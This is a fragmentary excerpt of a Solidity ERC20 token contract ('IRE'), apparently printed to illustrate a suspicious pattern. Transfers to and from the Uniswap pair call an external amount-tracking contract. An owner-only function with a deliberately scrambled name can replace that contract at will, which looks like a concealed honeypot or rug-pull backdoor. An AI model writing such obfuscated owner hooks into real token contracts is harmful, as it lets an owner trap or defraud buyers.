...
contract TokenM is ERC20 {
    ...
    IUserAmountChange public hesrzhange;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;

    constructor(address tokenOwner) ERC20("IRE", "IRE") {
        ...
        hesrzhange = new UserAmountChange();
    ...
    function zhangeNsorTmountFcoVe(IUserAmountChange _hesrzhange) public onlyOwner {
        hesrzhange = _hesrzhange;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                hesrzhange.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				hesrzhange.addOutAmount(from, amount);
            }else{
                hesrzhange.addOutAmount(from, amount);
                takeFee = false;
            }
